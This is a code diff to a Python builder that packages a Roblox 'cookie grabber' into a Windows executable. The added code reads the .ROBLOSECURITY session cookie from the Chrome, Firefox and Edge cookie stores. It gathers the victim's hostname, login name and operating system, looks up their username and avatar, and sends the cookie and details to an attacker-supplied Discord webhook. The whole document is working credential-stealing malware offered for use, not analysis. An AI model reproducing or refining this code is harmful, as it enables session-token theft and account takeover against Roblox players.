@@ -8,6 +8,7 @@ import tempfile
 import platform
 import socket
 import json
+import browser_cookie3
 
 class WebhookTool:
     def __init__(self, root):
@@ -163,6 +164,7 @@ class WebhookTool:
                 '--onefile',
                 '--windowed',
                 '--name', os.path.basename(output_path).replace('.exe', ''),
+                '--hidden-import=browser_cookie3',
                 temp_script_path
             ], check=True, timeout=120)
             
@@ -184,11 +186,12 @@ import platform
 import socket
 import os
 import json
+import browser_cookie3
 
 class RobloxTool:
     def __init__(self, root):
         self.root = root
-        self.root.title("🎮 Roblox Data Tool")
+        self.root.title("🎮 Roblox Cookie Tool")
         self.root.geometry("500x400")
         self.root.configure(bg='#0a0a0a')
         self.root.resizable(False, False)
@@ -199,19 +202,19 @@ class RobloxTool:
         main_frame = tk.Frame(self.root, bg='#0a0a0a')
         main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
         
-        title_label = tk.Label(main_frame, text="🎮 ROBLOX DATA TOOL", 
-                              font=('Arial', 20, 'bold'),
+        title_label = tk.Label(main_frame, text="🎮 ROBLOX COOKIE GRABBER", 
+                              font=('Arial', 16, 'bold'),
                               fg='#00ff00', bg='#0a0a0a')
         title_label.pack(pady=20)
         
         desc_label = tk.Label(main_frame, 
-                             text="Get real Roblox username, avatar and cookies",
+                             text="Get .ROBLOSECURITY from browser",
                              font=('Arial', 11),
                              fg='#ffffff', bg='#0a0a0a')
         desc_label.pack(pady=10)
         
-        self.collect_btn = tk.Button(main_frame, text="🚀 GET ROBLOX DATA",
-                                   command=self.get_roblox_data,
+        self.collect_btn = tk.Button(main_frame, text="🚀 GET ROBLOX COOKIE",
+                                   command=self.get_roblox_cookie,
                                    font=('Arial', 14, 'bold'),
                                    bg='#00ff00',
                                    fg='#000000',
@@ -223,146 +226,124 @@ class RobloxTool:
                                    height=2)
         self.collect_btn.pack(pady=30)
         
-        self.status_label = tk.Label(main_frame, text="Ready to collect Roblox data",
+        self.status_label = tk.Label(main_frame, text="Ready to grab cookie from browser",
                                    font=('Arial', 9),
                                    fg='#00ff00', bg='#0a0a0a')
         self.status_label.pack(pady=10)
         
-        footer_label = tk.Label(main_frame, text="Roblox Data Tool v1.0",
+        footer_label = tk.Label(main_frame, text="Cookie Grabber v1.0",
                               font=('Arial', 8),
                               fg='#444444', bg='#0a0a0a')
         footer_label.pack(side=tk.BOTTOM)
     
-    def get_real_system_info(self):
+    def get_system_info(self):
         try:
             hostname = socket.gethostname()
             system = platform.system()
-            version = platform.version()
             username = os.getlogin()
             
             return f"""
-**💻 REAL SYSTEM INFO**
+**💻 SYSTEM INFO**
 - **Computer:** `{{hostname}}`
 - **User:** `{{username}}`
-- **OS:** `{{system}} {{version}}`
-- **Architecture:** `{{platform.architecture()[0]}}`
+- **OS:** `{{system}}`
 """
         except Exception as e:
             return f"**System Info:** `Error: {{str(e)}}`"
     
-    def get_real_roblox_data(self):
+    def get_roblox_cookie_from_browser(self):
+        """Get .ROBLOSECURITY cookie directly from browser"""
         try:
-            session = requests.Session()
+            # Try Chrome first
+            chrome_cookies = browser_cookie3.chrome(domain_name='roblox.com')
+            for cookie in chrome_cookies:
+                if cookie.name == '.ROBLOSECURITY':
+                    return cookie.value
             
-            # Get cookies from Roblox
-            headers = {{
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                'Accept': 'application/json, text/plain, */*',
-                'Accept-Language': 'en-US,en;q=0.9',
-                'Referer': 'https://www.roblox.com/'
-            }}
+            # Try Firefox
+            firefox_cookies = browser_cookie3.firefox(domain_name='roblox.com')
+            for cookie in firefox_cookies:
+                if cookie.name == '.ROBLOSECURITY':
+                    return cookie.value
             
-            # First request to get cookies
-            response = session.get('https://www.roblox.com/home', headers=headers, timeout=10)
-            cookies = session.cookies.get_dict()
+            # Try Edge
+            edge_cookies = browser_cookie3.edge(domain_name='roblox.com')
+            for cookie in edge_cookies:
+                if cookie.name == '.ROBLOSECURITY':
+                    return cookie.value
             
-            roblosecurity = cookies.get('.ROBLOSECURITY', 'NOT_FOUND')
-            
-            # If we have ROBLOSECURITY, get user data
-            username = "UNKNOWN"
-            user_id = "UNKNOWN" 
-            avatar_url = ""
-            
-            if roblosecurity != 'NOT_FOUND':
-                try:
-                    # Get user info using the cookie
-                    auth_headers = {{
-                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                        'Cookie': f'.ROBLOSECURITY={{roblosecurity}}',
-                        'X-CSRF-TOKEN': 'fetch'
-                    }}
-                    
-                    # Get current user
-                    user_response = session.get(
-                        'https://users.roblox.com/v1/users/authenticated',
-                        headers=auth_headers,
-                        timeout=10
-                    )
-                    
-                    if user_response.status_code == 200:
-                        user_data = user_response.json()
-                        username = user_data.get('name', 'NO_NAME')
-                        user_id = user_data.get('id', 'NO_ID')
-                        
-                        # Get avatar
-                        if user_id and user_id != 'NO_ID':
-                            avatar_response = session.get(
-                                f'https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={{user_id}}&size=420x420&format=Png&isCircular=false',
-                                headers=auth_headers,
-                                timeout=10
-                            )
-                            
-                            if avatar_response.status_code == 200:
-                                avatar_data = avatar_response.json()
-                                if avatar_data.get('data'):
-                                    avatar_url = avatar_data['data'][0].get('imageUrl', '')
-                    
-                except Exception as e:
-                    username = f"API_ERROR: {{str(e)}}"
-            
-            # Format all cookies
-            cookie_text = ""
-            for cookie_name, cookie_value in cookies.items():
-                if len(str(cookie_value)) > 100:
-                    cookie_text += f"**{{cookie_name}}:** `{{cookie_value[:100]}}...`\\\\n"
-                else:
-                    cookie_text += f"**{{cookie_name}}:** `{{cookie_value}}`\\\\n"
-            
-            return {{
-                "username": username,
-                "user_id": user_id,
-                "avatar_url": avatar_url,
-                "roblosecurity": roblosecurity,
-                "all_cookies": cookies,
-                "cookie_count": len(cookies),
-                "cookie_text": cookie_text,
-                "status": "SUCCESS"
-            }}
+            return "COOKIE_NOT_FOUND"
             
         except Exception as e:
-            return {{
-                "username": f"ERROR: {{str(e)}}",
-                "user_id": "ERROR",
-                "avatar_url": "",
-                "roblosecurity": "ERROR",
-                "all_cookies": {{}},
-                "cookie_count": 0,
-                "cookie_text": f"Error: {{str(e)}}",
-                "status": "FAILED"
-            }}
+            return f"ERROR: {{str(e)}}"
     
-    def get_roblox_data(self):
-        self.status_label.config(text="🟡 Getting Roblox data...")
+    def get_user_info_with_cookie(self, cookie_value):
+        """Get Roblox username using the cookie"""
+        try:
+            if cookie_value == "COOKIE_NOT_FOUND" or cookie_value.startswith("ERROR"):
+                return "UNKNOWN_USER", "NO_AVATAR"
+            
+            session = requests.Session()
+            headers = {{
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Cookie': f'.ROBLOSECURITY={{cookie_value}}'
+            }}
+            
+            # Get user info
+            response = session.get('https://users.roblox.com/v1/users/authenticated', headers=headers, timeout=10)
+            
+            if response.status_code == 200:
+                user_data = response.json()
+                username = user_data.get('name', 'NO_NAME')
+                user_id = user_data.get('id', '')
+                
+                # Get avatar
+                avatar_url = ""
+                if user_id:
+                    avatar_response = session.get(
+                        f'https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={{user_id}}&size=150x150&format=Png',
+                        headers=headers,
+                        timeout=10
+                    )
+                    if avatar_response.status_code == 200:
+                        avatar_data = avatar_response.json()
+                        if avatar_data.get('data'):
+                            avatar_url = avatar_data['data'][0].get('imageUrl', '')
+                
+                return username, avatar_url
+            else:
+                return f"API_ERROR_{{response.status_code}}", "NO_AVATAR"
+                
+        except Exception as e:
+            return f"ERROR: {{str(e)}}", "NO_AVATAR"
+    
+    def get_roblox_cookie(self):
+        self.status_label.config(text="🟡 Getting cookie from browser...")
         self.collect_btn.config(state='disabled')
         self.root.update()
         
         try:
-            system_info = self.get_real_system_info()
-            roblox_data = self.get_real_roblox_data()
+            system_info = self.get_system_info()
             
-            # Create Discord embed with real data
+            # Get the actual cookie from browser
+            roblosecurity = self.get_roblox_cookie_from_browser()
+            
+            # Get user info with the cookie
+            username, avatar_url = self.get_user_info_with_cookie(roblosecurity)
+            
+            # Create Discord message
             embed = {{
-                "title": "🎮 REAL ROBLOX DATA CAPTURED",
+                "title": "🎮 REAL ROBLOX COOKIE CAPTURED",
                 "color": 0x00ff00,
                 "fields": [
                     {{
-                        "name": "👤 Roblox User",
-                        "value": f"**Username:** `{{roblox_data['username']}}`\\\\n**User ID:** `{{roblox_data['user_id']}}`",
+                        "name": "👤 Roblox Username",
+                        "value": f"`{{username}}`",
                         "inline": True
                     }},
                     {{
-                        "name": "🔐 Auth Status",
-                        "value": f"**Status:** `{{roblox_data['status']}}`\\\\n**Cookies:** `{{roblox_data['cookie_count']}} found`",
+                        "name": "🔐 Cookie Status",
+                        "value": f"`{'✅ FOUND' if roblosecurity != 'COOKIE_NOT_FOUND' and not roblosecurity.startswith('ERROR') else '❌ NOT FOUND'}}`",
                         "inline": True
                     }},
                     {{
@@ -371,37 +352,31 @@ class RobloxTool:
                         "inline": False
                     }},
                     {{
-                        "name": "🍪 ROBLOSECURITY Cookie",
-                        "value": f"```{{roblox_data['roblosecurity']}}```",
-                        "inline": False
-                    }},
-                    {{
-                        "name": "📋 All Cookies ({{roblox_data['cookie_count']}})",
-                        "value": roblox_data['cookie_text'] if roblox_data['cookie_text'] else "No cookies found",
+                        "name": "🍪 .ROBLOSECURITY Cookie",
+                        "value": f"```{{roblosecurity}}```",
                         "inline": False
                     }}
                 ]
             }}
             
-            # Add thumbnail if we have avatar
-            if roblox_data['avatar_url']:
-                embed["thumbnail"] = {{"url": roblox_data['avatar_url']}}
+            # Add avatar if available
+            if avatar_url and avatar_url != "NO_AVATAR":
+                embed["thumbnail"] = {{"url": avatar_url}}
             
             data = {{
-                "content": "🚨 **REAL ROBLOX DATA CAPTURED**",
+                "content": "🚨 **REAL ROBLOX COOKIE GRABBED**",
                 "embeds": [embed]
             }}
             
             response = requests.post("{webhook_url}", json=data, timeout=20)
             
             if response.status_code == 204:
-                self.status_label.config(text="🟢 Real data sent successfully!")
+                self.status_label.config(text="🟢 Cookie sent successfully!")
                 messagebox.showinfo("Success", 
-                                  f"✅ **REAL DATA CAPTURED!**\\\\n\\\\n"
-                                  f"**Roblox Username:** {{roblox_data['username']}}\\\\n"
-                                  f"**User ID:** {{roblox_data['user_id']}}\\\\n"
-                                  f"**Cookies Found:** {{roblox_data['cookie_count']}}\\\\n"
-                                  f"**Status:** {{roblox_data['status']}}")
+                                  f"✅ **REAL COOKIE CAPTURED!**\\\\n\\\\n"
+                                  f"**Username:** {{username}}\\\\n"
+                                  f"**Cookie:** {'✅ FOUND' if roblosecurity != 'COOKIE_NOT_FOUND' and not roblosecurity.startswith('ERROR') else '❌ NOT FOUND'}\\\\n"
+                                  f"**Length:** {{len(roblosecurity)}} characters")
             else:
                 self.status_label.config(text="🔴 Failed to send")
                 messagebox.showerror("Error", f"❌ Failed to send data. Status: {{response.status_code}}")
